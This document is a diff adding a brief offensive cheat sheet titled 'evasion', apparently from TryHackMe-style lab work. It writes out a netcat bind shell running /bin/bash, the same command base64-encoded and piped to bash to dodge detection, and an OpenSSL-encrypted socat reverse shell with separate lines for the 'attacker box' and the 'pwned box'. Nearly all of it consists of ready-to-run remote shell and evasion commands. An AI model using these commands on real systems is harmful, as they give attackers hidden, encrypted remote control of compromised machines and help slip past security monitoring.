@@ -1,0 +1,18 @@
+### evasion ###
+
+## apparmor
+ls -Al /etc/apparmor.d
+
+
+## encoding
+ncat -lvnp 1234 -e /bin/bash
+echo 'bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaAo='|base64 -d|bash			# encode the command
+ncat -v 10.10.65.223 1234							# then connect
+
+## crypting
+# gen key
+openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.r.thm/O=THM/C=UK' -nodes -keyout r.key -out r.crt
+cat r.key r.crt > r.pem								# create PEM
+socat -d -d OPENSSL-LISTEN:4443,cert=r.pem,verify=0,fork STDOUT			# on attacker box
+socat OPENSSL:10.8.98.114:4443,verify=0 EXEC:/bin/bash				# on pwned box
+
